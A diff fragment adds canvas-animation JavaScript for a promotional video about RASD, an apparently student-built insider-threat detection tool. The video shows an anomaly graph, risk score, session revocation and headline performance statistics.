+      const sumFade = easeOutCubic(Math.min(1, (sceneT-summaryStart)/0.8));
+      bctx.globalAlpha = sumFade;
+      bctx.textAlign='center';
+      bctx.fillStyle = '#00d4ff';
+      bctx.font = `300 ${Math.max(11, H*0.02)}px 'Inter',sans-serif`;
+      bctx.fillText('100% detection rate. 0 false positives.', W/2, H*0.93);
+      bctx.globalAlpha = 1;
+    }
+
+    bctx.textAlign='left';
+    hideText();
+    applyBoundaryFade(sceneT, sceneDur);
+  }
+
+  function wrapText(ctx, text, maxWidth){
+    const words = text.split(' ');
+    const lines = [];
+    let current = '';
+    words.forEach(w => {
+      const test = current ? current + ' ' + w : w;
+      if(ctx.measureText(test).width > maxWidth && current){
+        lines.push(current); current = w;
+      } else current = test;
+    });
+    if(current) lines.push(current);
+    return lines;
+  }
+
+  // ====== SCENE 4: DETECT (renamed from old scene 3) ======
+  function initMap(){
+    state.mapNodes = [];
+    const positions = [
+      [0.1,0.32],[0.16,0.6],[0.26,0.26],[0.34,0.55],[0.42,0.4],
+      [0.55,0.32],[0.62,0.58],[0.72,0.42],[0.82,0.55],[0.88,0.32]
+    ];
+    positions.forEach(([px,py],i)=>state.mapNodes.push({
+      x:px*W, y:py*H, base:Math.random()*Math.PI*2
+    }));
+  }
+
+  function drawScene3(t, sceneT, sceneDur){
+    bctx.fillStyle = '#000610';
+    bctx.fillRect(0,0,W,H);
+
+    // Smooth zoom-in: panel grows from 0.92 to 1.0
+    const zoom = 0.93 + smoothstep(Math.min(1, sceneT/2.0)) * 0.07;
+
+    // Background network (subtle)
+    bctx.globalAlpha = 0.6;
+    bctx.strokeStyle = 'rgba(0, 100, 150, 0.15)';
+    bctx.lineWidth = 0.5;
+    for(let i=0; i<state.mapNodes.length; i++){
+      for(let j=i+1; j<state.mapNodes.length; j++){
+        const d = Math.hypot(state.mapNodes[i].x-state.mapNodes[j].x, state.mapNodes[i].y-state.mapNodes[j].y);
+        if(d < W*0.3){
+          bctx.beginPath();
+          bctx.moveTo(state.mapNodes[i].x, state.mapNodes[i].y);
+          bctx.lineTo(state.mapNodes[j].x, state.mapNodes[j].y);
+          bctx.stroke();
+        }
+      }
+    }
+    state.mapNodes.forEach(n=>{
+      n.base += 0.03;
+      const pulse = (Math.sin(n.base) + 1) / 2;
+      bctx.fillStyle = `rgba(0, 212, 255, ${0.25+pulse*0.3})`;
+      bctx.beginPath();
+      bctx.arc(n.x, n.y, 2 + pulse*1.5, 0, Math.PI*2);
+      bctx.fill();
+    });
+    bctx.globalAlpha = 1;
+
+    // Main interface panel
+    bctx.save();
+    bctx.translate(W/2, H/2);
+    bctx.scale(zoom, zoom);
+    bctx.translate(-W/2, -H/2);
+
+    const px = W*0.18, py = H*0.18, pw = W*0.64, ph = H*0.64;
+    bctx.fillStyle = 'rgba(0, 14, 24, 0.94)';
+    bctx.fillRect(px, py, pw, ph);
+    bctx.strokeStyle = 'rgba(0, 212, 255, 0.4)';
+    bctx.lineWidth = 1;
+    bctx.strokeRect(px, py, pw, ph);
+    drawCorner(bctx, px, py, 14, '#00d4ff');
+    drawCorner(bctx, px+pw, py, 14, '#00d4ff', 'tr');
+    drawCorner(bctx, px, py+ph, 14, '#00d4ff', 'bl');
+    drawCorner(bctx, px+pw, py+ph, 14, '#00d4ff', 'br');
+
+    // Header
+    const hh = H*0.06;
+    bctx.fillStyle = 'rgba(0, 60, 90, 0.4)';
+    bctx.fillRect(px, py, pw, hh);
+    bctx.fillStyle = '#00d4ff';
+    bctx.font = `600 ${Math.max(10, H*0.018)}px 'Inter',sans-serif`;
+    bctx.textAlign = 'left';
+    bctx.fillText('RASD · AGENT 2 · BEHAVIORAL ANALYSIS', px+14, py+hh*0.62);
+    bctx.fillStyle = 'rgba(120, 180, 200, 0.6)';
+    bctx.font = `${Math.max(8, H*0.013)}px 'JetBrains Mono',monospace`;
+    bctx.textAlign='right';
+    const liveBlink = Math.floor(t*2)%2===0 ? 'rgba(0,255,100,0.9)':'rgba(0,255,100,0.3)';
+    bctx.fillStyle = liveBlink;
+    bctx.beginPath(); bctx.arc(px+pw-58, py+hh*0.55, 3, 0, Math.PI*2); bctx.fill();
+    bctx.fillStyle = 'rgba(120, 180, 200, 0.7)';
+    bctx.fillText('LIVE  eu-north-1', px+pw-12, py+hh*0.62);
+
+    // User
+    bctx.textAlign='left';
+    bctx.fillStyle = 'rgba(180, 220, 230, 0.85)';
+    bctx.font = `500 ${Math.max(9, H*0.015)}px 'Inter',sans-serif`;
+    bctx.fillText('User:', px+14, py+hh+22);
+    bctx.fillStyle = 'rgba(0, 212, 255, 0.9)';
+    bctx.font = `${Math.max(9, H*0.014)}px 'JetBrains Mono',monospace`;
+    bctx.fillText('usr_a7e3b4f1c2d8...', px+50, py+hh+22);
+    bctx.fillStyle = 'rgba(120, 180, 200, 0.5)';
+    bctx.font = `${Math.max(8, H*0.012)}px 'JetBrains Mono',monospace`;
+    bctx.fillText('SHA-256 pseudonymised', px+50, py+hh+38);
+
+    // Graph
+    const graphX = px+20, graphY = py+hh+58, graphW = pw-40, graphH = ph*0.42;
+    bctx.strokeStyle = 'rgba(0, 100, 130, 0.4)';
+    bctx.lineWidth = 0.5;
+    bctx.beginPath();
+    bctx.moveTo(graphX, graphY+graphH); bctx.lineTo(graphX+graphW, graphY+graphH); bctx.stroke();
+    bctx.beginPath();
+    bctx.moveTo(graphX, graphY); bctx.lineTo(graphX, graphY+graphH); bctx.stroke();
+    for(let i=1;i<5;i++){
+      bctx.strokeStyle = 'rgba(0, 100, 130, 0.1)';
+      bctx.beginPath();
+      bctx.moveTo(graphX, graphY+graphH*i/5);
+      bctx.lineTo(graphX+graphW, graphY+graphH*i/5);
+      bctx.stroke();
+    }
+    bctx.fillStyle = 'rgba(100, 150, 170, 0.6)';
+    bctx.font = `${Math.max(7, H*0.011)}px 'JetBrains Mono',monospace`;
+    bctx.textAlign='right';
+    bctx.fillText('100', graphX-4, graphY+8);
+    bctx.fillText('50', graphX-4, graphY+graphH/2+3);
+    bctx.fillText('0', graphX-4, graphY+graphH);
+
+    state.wavePhase += 0.05;
+    const anomalyTrigger = 1.8;
+    const revokeTrigger = 4.2;
+
+    // Smooth progressive line drawing
+    bctx.lineWidth = 1.8;
+    const progressX = easeOutQuart(Math.min(1, sceneT/3.5));
+    let spikeX = -1, spikeY = 0;
+    bctx.beginPath();
+    for(let i=0; i<=graphW*progressX; i+=1){
+      const xRatio = i / graphW;
+      let y;
+      const inAnomaly = xRatio > 0.7 && sceneT > anomalyTrigger;
+      if(inAnomaly){
+        const ap = (xRatio - 0.7)/0.3;
+        const spike = Math.sin(ap*Math.PI) * graphH * 0.85;
+        y = graphY + graphH - spike - Math.sin(ap*30)*4;
+        if(ap > 0.45 && ap < 0.55 && spikeX < 0){
+          spikeX = graphX + i;
+          spikeY = y;
+        }
+      } else {
+        y = graphY + graphH*0.5 + Math.sin((xRatio*8 + state.wavePhase))*graphH*0.08 + Math.sin(xRatio*30)*graphH*0.03;
+      }
+      bctx.strokeStyle = (xRatio > 0.65 && sceneT > anomalyTrigger) ? 'rgba(255, 60, 60, 0.95)' : 'rgba(0, 212, 255, 0.85)';
+      if(i === 0) bctx.moveTo(graphX+i, y);
+      else bctx.lineTo(graphX+i, y);
+    }
+    bctx.stroke();
+
+    if(sceneT > anomalyTrigger){
+      bctx.fillStyle = 'rgba(255, 60, 60, 0.08)';
+      bctx.beginPath();
+      bctx.moveTo(graphX + graphW*0.7, graphY+graphH);
+      for(let i=graphW*0.7; i<=graphW*progressX; i+=2){
+        const xRatio = i/graphW;
+        const ap = (xRatio - 0.7)/0.3;
+        const spike = Math.sin(ap*Math.PI) * graphH * 0.85;
+        bctx.lineTo(graphX+i, graphY+graphH-spike);
+      }
+      bctx.lineTo(graphX+graphW*progressX, graphY+graphH);
+      bctx.closePath();
+      bctx.fill();
+    }
+
+    // Anomaly marker
+    if(sceneT > anomalyTrigger + 0.3 && spikeX > 0){
+      const mFade = easeOutCubic(Math.min(1, (sceneT-anomalyTrigger-0.3)/0.4));
+      bctx.globalAlpha = mFade;
+      bctx.strokeStyle = 'rgba(255, 60, 60, 0.8)';
+      bctx.setLineDash([3,3]);
+      bctx.lineWidth = 0.8;
+      bctx.beginPath();
+      bctx.moveTo(spikeX, spikeY); bctx.lineTo(spikeX, spikeY - 30);
+      bctx.stroke();
+      bctx.setLineDash([]);
+      bctx.fillStyle = '#ff3b3b';
+      bctx.font = `700 ${Math.max(8, H*0.013)}px 'JetBrains Mono',monospace`;
+      bctx.textAlign='center';
+      bctx.fillText('ANOMALY', spikeX, spikeY - 36);
+      bctx.globalAlpha = 1;
+    }
+
+    // Score ring
+    if(sceneT > anomalyTrigger + 0.5){
+      const sp = easeOutCubic(Math.min(1, (sceneT - anomalyTrigger - 0.5)/1.4));
+      const targetScore = Math.floor(sp * 100);
+      const scoreX = px + pw - 75, scoreY = py + hh + 110;
+      const scoreR = 32;
+      bctx.strokeStyle = 'rgba(255, 60, 60, 0.2)';
+      bctx.lineWidth = 5;
+      bctx.beginPath();
+      bctx.arc(scoreX, scoreY, scoreR, 0, Math.PI*2); bctx.stroke();
+      bctx.strokeStyle = '#ff3b3b';
+      bctx.lineWidth = 5;
+      bctx.lineCap = 'round';
+      bctx.beginPath();
+      bctx.arc(scoreX, scoreY, scoreR, -Math.PI/2, -Math.PI/2 + Math.PI*2*sp);
+      bctx.stroke();
+      bctx.lineCap='butt';
+      bctx.fillStyle = '#ff3b3b';
+      bctx.font = `900 ${Math.max(20, H*0.04)}px 'Inter',sans-serif`;
+      bctx.textAlign='center';
+      bctx.fillText(targetScore.toString(), scoreX, scoreY+6);
+      bctx.fillStyle = 'rgba(255, 100, 100, 0.6)';
+      bctx.font = `500 ${Math.max(8, H*0.012)}px 'Inter',sans-serif`;
+      bctx.fillText('RISK', scoreX, scoreY+22);
+    }
+
+    // SHAP
+    if(sceneT > anomalyTrigger + 1.4){
+      const fade = easeOutCubic(Math.min(1, (sceneT - anomalyTrigger - 1.4)/0.7));
+      bctx.globalAlpha = fade;
+      const shapY = py + ph - H*0.18;
+      bctx.fillStyle = 'rgba(0, 30, 50, 0.6)';
+      bctx.fillRect(px+20, shapY, pw*0.55, H*0.13);
+      bctx.fillStyle = 'rgba(0, 212, 255, 0.8)';
+      bctx.font = `600 ${Math.max(8, H*0.012)}px 'Inter',sans-serif`;
+      bctx.textAlign='left';
+      bctx.fillText('SHAP · TOP CONTRIBUTORS', px+30, shapY+15);
+      const features = [
+        {name:'high_risk_action',     val:0.44},
+        {name:'resource_sensitivity', val:0.21},
+        {name:'is_after_hours',       val:0.17}
+      ];
+      features.forEach((f,i) => {
+        const fy = shapY + 28 + i*16;
+        // Smooth bar fill
+        const barProg = easeOutCubic(Math.min(1, (sceneT - anomalyTrigger - 1.4 - i*0.15)/0.4));
+        bctx.fillStyle = 'rgba(200, 230, 240, 0.8)';
+        bctx.font = `${Math.max(8, H*0.012)}px 'JetBrains Mono',monospace`;
+        bctx.fillText(f.name, px+30, fy+8);
+        const barX = px+30+pw*0.28, barW = pw*0.18, fillW = barW*f.val/0.5;
+        bctx.fillStyle = 'rgba(0, 60, 80, 0.6)';
+        bctx.fillRect(barX, fy+2, barW, 8);
+        bctx.fillStyle = '#00d4ff';
+        bctx.fillRect(barX, fy+2, fillW*barProg, 8);
+        bctx.fillStyle = 'rgba(0, 212, 255, 0.9)';
+        bctx.font = `600 ${Math.max(8, H*0.012)}px 'JetBrains Mono',monospace`;
+        bctx.textAlign='right';
+        bctx.fillText('+'+(f.val*barProg).toFixed(2), px+30+pw*0.5, fy+8);
+        bctx.textAlign='left';
+      });
+      bctx.globalAlpha = 1;
+    }
+
+    // Enforcement
+    if(sceneT > revokeTrigger){
+      const eFade = easeOutCubic(Math.min(1, (sceneT-revokeTrigger)/0.4));
+      bctx.globalAlpha = eFade;
+      const eX = px+pw*0.6, eY = py + ph - H*0.18;
+      const eW = pw*0.36, eH = H*0.13;
+      const flash = Math.floor((sceneT-revokeTrigger)*4)%2 === 0;
+      bctx.fillStyle = flash ? 'rgba(255, 40, 40, 0.25)' : 'rgba(255, 40, 40, 0.15)';
+      bctx.fillRect(eX, eY, eW, eH);
+      bctx.strokeStyle = '#ff3b3b';
+      bctx.lineWidth = 1.5;
+      bctx.strokeRect(eX, eY, eW, eH);
+      bctx.fillStyle = '#ff3b3b';
+      bctx.font = `800 ${Math.max(11, H*0.018)}px 'Inter',sans-serif`;
+      bctx.textAlign='center';
+      bctx.fillText('SESSION REVOKED', eX+eW/2, eY+25);
+      bctx.fillStyle = 'rgba(255, 150, 150, 0.85)';
+      bctx.font = `${Math.max(8, H*0.012)}px 'JetBrains Mono',monospace`;
+      bctx.fillText('IAM:DenyAll · STS:Revoke', eX+eW/2, eY+44);
+      bctx.fillStyle = '#00d4ff';
+      bctx.font = `700 ${Math.max(9, H*0.014)}px 'JetBrains Mono',monospace`;
+      bctx.fillText('Latency: 2ms', eX+eW/2, eY+62);
+      bctx.textAlign='left';
+      bctx.globalAlpha = 1;
+    }
+
+    bctx.restore();
+
+    // Overlay text
+    if(sceneT > 0.3 && sceneT < 1.8){
+      showText(`
+        <div class="kicker">Meet RASD</div>
+        <div class="headline">Two agents.<br><b>One mission.</b></div>
+      `);
+    } else if(sceneT > 5.0 && sceneT < 8.3){
+      showText(`
+        <div class="kicker">Detected · Scored · Stopped</div>
+        <div class="headline"><b>2 milliseconds.</b><br>Threat neutralized.</div>
+      `);
+    } else { hideText(); }
+
+    drawParticles(0.12);
+    applyBoundaryFade(sceneT, sceneDur);
+  }
+
+  // ====== SCENE 5: NUMBERS (fixed bottom spacing) ======
+  function drawScene4(t, sceneT, sceneDur){
+    bctx.fillStyle = '#000610';
+    bctx.fillRect(0,0,W,H);
+
+    // Subtle moving grid
+    bctx.strokeStyle = 'rgba(0, 60, 90, 0.18)';
+    bctx.lineWidth = 0.5;
+    const gridSize = 60;
+    const offset = (sceneT * 7) % gridSize;
+    for(let y=-offset; y<H; y+=gridSize){
+      bctx.beginPath(); bctx.moveTo(0,y); bctx.lineTo(W,y); bctx.stroke();
+    }
+    for(let x=-offset; x<W; x+=gridSize){
+      bctx.beginPath(); bctx.moveTo(x,0); bctx.lineTo(x,H); bctx.stroke();
+    }
+
+    // Cards positioned with TOP margin for grid, BOTTOM reserved for tagline
+    // Tagline area: H*0.91 to H*0.97 (kept clear)
+    // Cards area: H*0.10 to H*0.86
+    const cardW = W*0.4, cardH = H*0.34, gap = W*0.04;
+    const totalH = cardH*2 + H*0.04;
+    const gridStartY = H*0.10;
+    const positions = [
+      [W*0.08,         gridStartY],
+      [W*0.08+cardW+gap, gridStartY],
+      [W*0.08,         gridStartY + cardH + H*0.04],
+      [W*0.08+cardW+gap, gridStartY + cardH + H*0.04]
+    ];
+
+    const stats = [
+      {val:'0.9999', unit:'AUC-ROC',         sub:'CERT r4.2 · 200K events',     t:0.4, suffix:''},
+      {val:'3',      unit:'P95 LATENCY',     sub:'33× faster than required',    t:1.5, suffix:' ms'},
+      {val:'0.017',  unit:'FALSE POSITIVES', sub:'33 in 199,615 events',        t:2.8, suffix:'%'},
+      {val:'80',     unit:'PER MONTH',       sub:'vs $50,000 SIEM',             t:4.1, suffix:' $/mo'}
+    ];
+
+    stats.forEach((s,i)=>{
+      if(sceneT < s.t) return;
+      const ts = sceneT - s.t;
+      const enter = easeOutCubic(Math.min(1, ts/0.55));
+      const scale = 0.88 + enter*0.12;
+      const [cx, cy] = positions[i];
+      const offX = cx + (1-enter)*12;
+
+      bctx.save();
+      bctx.globalAlpha = enter;
+      bctx.translate(offX + cardW/2, cy + cardH/2);
+      bctx.scale(scale, scale);
+      bctx.translate(-cardW/2, -cardH/2);
+
+      // Shockwave
+      if(ts < 0.7){
+        const wave = ts/0.7;
+        bctx.strokeStyle = `rgba(0, 212, 255, ${(1-wave)*0.45})`;
+        bctx.lineWidth = 2;
+        bctx.strokeRect(-wave*25, -wave*25, cardW+wave*50, cardH+wave*50);
+      }
+
+      // Card
+      bctx.fillStyle = 'rgba(0, 16, 28, 0.88)';
+      bctx.fillRect(0, 0, cardW, cardH);
+      bctx.strokeStyle = 'rgba(0, 212, 255, 0.35)';
+      bctx.lineWidth = 1;
+      bctx.strokeRect(0, 0, cardW, cardH);
+      drawCorner(bctx, 0, 0, 14, '#00d4ff');
+      drawCorner(bctx, cardW, 0, 14, '#00d4ff', 'tr');
+      drawCorner(bctx, 0, cardH, 14, '#00d4ff', 'bl');
+      drawCorner(bctx, cardW, cardH, 14, '#00d4ff', 'br');
+
+      // Index
+      bctx.fillStyle = 'rgba(0, 212, 255, 0.4)';
+      bctx.font = `300 ${Math.max(10, H*0.016)}px 'JetBrains Mono',monospace`;
+      bctx.textAlign='left';
+      bctx.fillText(`0${i+1} /  04`, 18, 24);
+
+      // Count-up number
+      const countProg = easeOutCubic(Math.min(1, ts/0.9));
+      bctx.fillStyle = '#00d4ff';
+      bctx.font = `900 ${Math.max(32, H*0.075)}px 'Inter',sans-serif`;
+      bctx.textAlign='left';
+      let displayVal = s.val;
+      if(countProg < 1){
+        const numVal = parseFloat(s.val);
+        if(!isNaN(numVal)){
+          const cv = numVal * countProg;
+          const decimals = s.val.includes('.') ? s.val.split('.')[1].length : 0;
+          displayVal = decimals ? cv.toFixed(decimals) : Math.floor(cv).toString();
+        }
+      }
+      bctx.fillText(displayVal, 22, cardH*0.52);
+
+      // Suffix
+      const numWidth = bctx.measureText(displayVal).width;
+      bctx.fillStyle = 'rgba(0, 212, 255, 0.6)';
+      bctx.font = `500 ${Math.max(14, H*0.028)}px 'Inter',sans-serif`;
+      bctx.fillText(s.suffix, 22+numWidth+4, cardH*0.52);
+
+      // Unit
+      bctx.fillStyle = 'rgba(0, 212, 255, 0.85)';
+      bctx.font = `600 ${Math.max(10, H*0.017)}px 'Inter',sans-serif`;
+      bctx.fillText(s.unit, 22, cardH*0.70);
+
+      // Sub
+      bctx.fillStyle = 'rgba(120, 170, 190, 0.75)';
+      bctx.font = `400 ${Math.max(9, H*0.013)}px 'Inter',sans-serif`;
+      bctx.fillText(s.sub, 22, cardH*0.84);
+
+      // Sparkline
+      bctx.strokeStyle = 'rgba(0, 212, 255, 0.6)';
+      bctx.lineWidth = 1;
+      bctx.beginPath();
+      bctx.moveTo(cardW-60, cardH*0.22);
+      for(let sx=0; sx<50; sx++){
+        const sy = cardH*0.22 + Math.sin(sx*0.4 + ts*2)*3 + (sx<20?0:-sx*0.15);
+        bctx.lineTo(cardW-60+sx, sy);
+      }
+      bctx.stroke();
+
+      bctx.restore();
+    });
+
+    // Tagline at the very bottom — single centered line, well-separated
+    if(sceneT > 6.0){
+      const fade = easeOutCubic(Math.min(1, (sceneT-6.0)/0.7));
+      bctx.globalAlpha = fade;
+      bctx.textAlign='center';
+      bctx.fillStyle = 'rgba(120, 170, 190, 0.5)';
+      bctx.font = `300 ${Math.max(11, H*0.022)}px 'Inter',sans-serif`;
+      bctx.fillText('Not just better.', W*0.36, H*0.95);
+      bctx.fillStyle = '#00d4ff';
+      bctx.font = `700 ${Math.max(11, H*0.022)}px 'Inter',sans-serif`;
+      bctx.fillText('A different league entirely.', W*0.62, H*0.95);
+      bctx.globalAlpha = 1;
+    }
+
+    bctx.textAlign='left';
+    hideText();
+    applyBoundaryFade(sceneT, sceneDur);
+  }
+
+  // ====== SCENE 6: REVEAL ======
+  function drawScene5(t, sceneT, sceneDur){
+    bctx.fillStyle = '#000510';
+    bctx.fillRect(0,0,W,H);
+
+    // Server lights
+    for(let row=0; row<6; row++){
+      for(let col=0; col<28; col++){
+        const lx = W*0.05 + col*(W*0.9/28);
+        const ly = H*0.68 + row*(H*0.045);
+        const pulse = (Math.sin(t*1.5 + row*0.3 + col*0.7) + 1)/2;
+        const isCyan = (row+col) % 3 === 0;
+        const color = isCyan ? `rgba(0, 212, 255, ${0.1+pulse*0.4})` : `rgba(0, 80, 120, ${0.08+pulse*0.15})`;
+        bctx.fillStyle = color;
+        bctx.fillRect(lx, ly, 2, 4);
+      }
+    }
+    for(let row=0; row<6; row++){
+      bctx.strokeStyle = 'rgba(0, 60, 90, 0.2)';
+      bctx.lineWidth = 0.5;
+      bctx.beginPath();
+      bctx.moveTo(W*0.05, H*0.68 + row*(H*0.045) + 6);
+      bctx.lineTo(W*0.95, H*0.68 + row*(H*0.045) + 6);
+      bctx.stroke();
+    }
+
+    // Radial glow
+    const gg = bctx.createRadialGradient(W/2, H*0.4, 0, W/2, H*0.4, H*0.7);
+    gg.addColorStop(0, 'rgba(0, 80, 130, 0.3)');
+    gg.addColorStop(0.5, 'rgba(0, 30, 60, 0.15)');
+    gg.addColorStop(1, 'rgba(0, 0, 8, 0.95)');
+    bctx.fillStyle = gg;
+    bctx.fillRect(0,0,W,H);
+
+    // Arabic logo — smooth scale + fade
+    const logoFade = easeOutCubic(Math.min(1, sceneT/1.4));
+    const logoScale = 0.82 + logoFade*0.18;
+    bctx.save();
+    bctx.globalAlpha = logoFade;
+    bctx.translate(W/2, H*0.3);
+    bctx.scale(logoScale, logoScale);
+
+    for(let ring=1; ring<=3; ring++){
+      const ringPulse = (Math.sin(t*1.3 + ring*0.6) + 1)/2;
+      bctx.strokeStyle = `rgba(0, 212, 255, ${0.08+ringPulse*0.1})`;
+      bctx.lineWidth = 0.8;
+      bctx.beginPath();
+      bctx.arc(0, 0, H*0.12 + ring*H*0.04, 0, Math.PI*2);
+      bctx.stroke();
+    }
+
+    bctx.fillStyle = '#00d4ff';
+    bctx.font = `700 ${Math.max(42, H*0.13)}px 'Amiri','Noto Naskh Arabic',serif`;
+    bctx.textAlign='center';
+    bctx.textBaseline='middle';
+    bctx.shadowColor = 'rgba(0, 212, 255, 0.6)';
+    bctx.shadowBlur = 30;
+    bctx.fillText('رصد', 0, 0);
+    bctx.shadowBlur = 0;
+    bctx.textBaseline='alphabetic';
+    bctx.restore();
+
+    if(sceneT > 1.2){
+      const tp = easeOutCubic(Math.min(1, (sceneT-1.2)/0.8));
+      bctx.globalAlpha = tp;
+      bctx.textAlign='center';
+      bctx.fillStyle = '#fff';
+      bctx.font = `200 ${Math.max(28, H*0.07)}px 'Inter',sans-serif`;
+      bctx.fillText('RASD', W/2, H*0.54);
+      bctx.strokeStyle = 'rgba(0, 212, 255, 0.6)';
+      bctx.lineWidth = 1;
+      bctx.beginPath();
+      bctx.moveTo(W/2-50, H*0.58); bctx.lineTo(W/2+50, H*0.58);
+      bctx.stroke();
+      bctx.globalAlpha = 1;
+    }
+
+    if(sceneT > 2.2){
+      const tp = easeOutCubic(Math.min(1, (sceneT-2.2)/0.7));
+      bctx.globalAlpha = tp;
+      bctx.textAlign='center';
+      bctx.fillStyle = 'rgba(180, 220, 230, 0.9)';
+      bctx.font = `300 ${Math.max(11, H*0.022)}px 'Inter',sans-serif`;
+      bctx.fillText('AI-Powered Insider Threat Detection', W/2, H*0.62);
+      bctx.fillStyle = 'rgba(120, 170, 190, 0.7)';
+      bctx.font = `300 ${Math.max(9, H*0.016)}px 'Inter',sans-serif`;
+      bctx.fillText('Zero Trust · AWS Cloud Native · Sub-3ms enforcement', W/2, H*0.66);
+      bctx.globalAlpha = 1;
+    }
+
+    if(sceneT > 3.6){
+      const tp = easeOutCubic(Math.min(1, (sceneT-3.6)/0.8));
+      bctx.globalAlpha = tp;
+      bctx.fillStyle = 'rgba(100, 150, 170, 0.7)';
+      bctx.font = `400 ${Math.max(9, H*0.015)}px 'Inter',sans-serif`;
+      bctx.textAlign='center';
+      bctx.fillText('— Built by students.  Ready for the real world. —', W/2, H*0.95);
+      bctx.globalAlpha = 1;
+    }
+
+    bctx.textAlign='left';
+    hideText();
+    applyBoundaryFade(sceneT, sceneDur);
+  }
+
+  // ====== overlay text helpers ======
+  let currentText = '';
+  function showText(html){
+    if(currentText !== html){
+      currentText = html;
+      overlay.innerHTML = html;
+    }
+    overlay.classList.add('show');
+  }
+  function hideText(){
+    overlay.classList.remove('show');
+    if(!overlay.classList.contains('show')) currentText = '';
+  }
+
+  // ====== main loop ======
+  const drawers = [drawScene0, drawScene1, drawScene2, drawScene3, drawScene4, drawScene5];
+
+  function loop(now){
+    if(!running) return;
+    const t = (now - startTime)/1000;
+    if(t >= DUR){
+      running = false;
+      progress.style.width = '100%';
+      timecode.textContent = formatTime(DUR) + ' / ' + formatTime(DUR);
+      replayBtn.classList.add('show');
+      // Final fade
+      bctx.fillStyle = 'rgba(0,0,0,0.4)';
+      bctx.fillRect(0,0,W,H);
+      return;
+    }
+
+    progress.style.width = (t/DUR*100) + '%';
+    timecode.textContent = formatTime(t) + ' / ' + formatTime(DUR);
+
+    let activeScene = 0;
+    for(let i=0;i<scenes.length;i++){
+      if(t >= scenes[i].start && t < scenes[i].end){
+        activeScene = i;
+        break;
+      }
+    }
+    if(activeScene !== lastScene){
+      chapterEls.forEach((el,i)=>{
+        el.classList.toggle('active', i === activeScene);
+      });
+      lastScene = activeScene;
+    }
+
+    const sc = scenes[activeScene];
+    const sceneT = t - sc.start;
+    const sceneDur = sc.end - sc.start;
+
+    drawers[activeScene](t, sceneT, sceneDur);
+
+    rafId = requestAnimationFrame(loop);
+  }
+
+  function formatTime(s){
+    const mm = Math.floor(s/60).toString().padStart(2,'0');
+    const ss = Math.floor(s%60).toString().padStart(2,'0');
+    return `${mm}:${ss}`;
+  }
+
+  function start(){
+    if(running) return;
+    running = true;
+    playScreen.classList.add('fade');
+    setTimeout(()=>{ playScreen.style.display = 'none'; }, 600);
+    replayBtn.classList.remove('show');
+    initParticles(50);
+    initAlerts();
+    initMap();
+    state.s1_cursor = 0;
+    state.wavePhase = 0;
+    currentText = '';
+    overlay.innerHTML = '';
+    overlay.classList.remove('show');
+    lastScene = -1;
+    startTime = performance.now();
+    rafId = requestAnimationFrame(loop);
+  }
+
+  playScreen.addEventListener('click', start);
+  replayBtn.addEventListener('click', () => {
+    playScreen.classList.remove('fade');
+    playScreen.style.display = 'flex';
+    replayBtn.classList.remove('show');
+    bctx.fillStyle = '#000';
+    bctx.fillRect(0,0,W,H);
+    progress.style.width = '0%';
+    timecode.textContent = '00:00 / 00:52';
+  });
+  window.addEventListener('resize', resize);
+  resize();
+  bctx.fillStyle = '#000';
+  bctx.fillRect(0,0,W,H);
+})();
+</script>
